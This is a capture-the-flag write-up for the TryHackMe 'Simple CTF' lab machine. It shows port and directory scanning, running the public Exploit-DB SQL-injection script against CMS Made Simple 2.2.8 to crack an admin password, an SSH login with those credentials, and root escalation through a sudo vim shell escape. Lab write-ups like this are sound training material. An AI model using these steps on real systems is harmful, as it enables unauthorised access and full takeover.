# TryHackMe - Simple CTF (Write-Up)

_4 min read · February 18, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Simple CTF**](https://tryhackme.com/room/easyctf) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain User and Root Flag
- Difficulty: Easy
- Machine Author: MrSeth6797

---

## Scanning for Open Ports

The machine IP address in my case is **10.48.152.145**.

Again as usual:

```bash
nmap -sS 10.48.152.145
sudo nmap -sCV -p 21,80,2222 10.48.152.145
```

![Nmap Output](./img/thm-simplectf/Nmap-output.png)

From the scan result, I noticed that:

- FTP (port 21) is open and anonymous login is allowed.
- HTTP (port 80) is open.
- SSH (port 2222) is open.

As usual, I always browsed the site first.

![Simple CTF: Website](./img/thm-simplectf/web.png)

I inspected the source code as well but I didn't find anything interesting.

---

## Futher Enumeration on the Website

I used [**Gobuster**](https://www.kali.org/tools/gobuster/) to enumerate the site.

```bash
gobuster dir -u http://10.48.152.145 -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster Output](./img/thm-simplectf/gobuster-output.png)

Then I accessed the `robots.txt`.

```output
User-agent: *
Disallow: /
Disallow: /openemr-5_0_1_3
```

I tried to access `/openemr-5_0_1_3` but I got an error.

Then I accessed the `/simple/` directory and I saw that the site is powered by [CMS Made Simple](https://www.cmsmadesimple.org/) version 2.2.8.

---

## Exploitation (SQLi)

I searched for an exploit for that CMS version and found [CMS Made Simple < 2.2.10 - SQL Injection](https://www.exploit-db.com/exploits/46635).

Then I used [**searchsploit**](https://www.kali.org/tools/exploitdb/) to save it in my current working directory:

```bash
searchsploit -m 46635
```

Before running it, I read the exploit to understand its options.

```bash
cat 46635.py
```

```output
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)
```

Then I executed the exploit:

```bash
python 46635.py -u http://10.48.152.145/simple -w /usr/share/wordlists/rockyou.txt -c
```

The script performed SQL injection to extract the admin hash and then cracked it using `rockyou.txt`.

![Exploit Output](./img/thm-simplectf/46635-output.png)

---

## Post-Exploitation Enumeration

I used the credentials to log in via SSH.

```bash
ssh mitch@10.48.152.145 -p 2222
secret
```

Anddd I found the **user flag**.

![User Flag](./img/thm-simplectf/user-flag.png)

Then as usual, I performed my post-exploitation checklist.

```bash
sudo -l
```

```output
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

---

## Privilege Escalation

Since `vim` is allowed with `sudo`, I launched it as root:

```bash
sudo vim
```

Inside `vim`, I executed:

```bash
!:/bin/bash <enter>
```

This spawns a shell from within `vim`. Because `vim` was executed with `sudo`, the shell runs as root.

After that, I retrieved the **root flag**.

```bash
cd /root
cat root.txt
```

![Root Flag](./img/thm-simplectf/root-flag.png)

Bomba! Settleee.

---

## Session Terminated

TryHackMe - Simple CTF is an easy machine. From this machine, I learned how to:

- search for and analyze public exploits
- exploit SQL injection vulnerabilities in CMS Made Simple
- abuse `vim` to spawn a root shell

Well, nothing much to say here, thank you for reading and see you next time!
